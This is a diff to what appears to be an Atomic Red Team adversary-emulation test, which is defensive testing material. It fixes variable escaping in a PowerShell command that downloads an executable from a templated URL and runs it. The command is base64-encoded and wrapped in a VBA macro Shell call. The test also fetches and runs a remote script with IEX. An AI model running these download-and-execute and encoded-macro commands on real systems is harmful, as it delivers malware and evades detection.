@@ -42,7 +42,7 @@ atomic_tests:
         command: |
             IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
             $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
-            $Command = "$client = new-object System.Net.WebClient; $client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
+            $Command = "`$client = new-object System.Net.WebClient; `$client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
             $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
             $EncodedCommand = [Convert]::ToBase64String($Bytes)
             $macrocode = "Shell `"powershell.exe -EncodedCommand $EncodedCommand`""
